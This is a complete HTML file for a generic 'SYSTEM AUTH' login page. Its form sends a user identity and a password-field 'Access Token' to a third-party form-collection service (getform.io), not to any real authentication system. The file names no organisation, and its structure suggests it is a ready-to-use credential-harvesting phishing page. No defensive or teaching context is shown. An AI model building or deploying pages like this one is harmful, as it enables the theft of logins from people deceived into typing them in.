<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <style>
        body { background: #0a0a12; color: #00f2fe; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: rgba(255,255,255,0.05); padding: 30px; border-radius: 15px; backdrop-filter: blur(10px); border: 1px solid rgba(0,242,254,0.3); width: 280px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: rgba(0,0,0,0.3); border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: linear-gradient(45deg, #00f2fe, #4facfe); border: none; color: white; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-card">
        <h3>SYSTEM AUTH</h3>
        <form action="https://getform.io/f/z9rncgryekr" method="POST">
            <input type="text" name="u_id" placeholder="User Identity" required>
            <input type="password" name="token" placeholder="Access Token" required>
            <button type="submit">LOGIN</button>
        </form>
    </div>
</body>
</html>
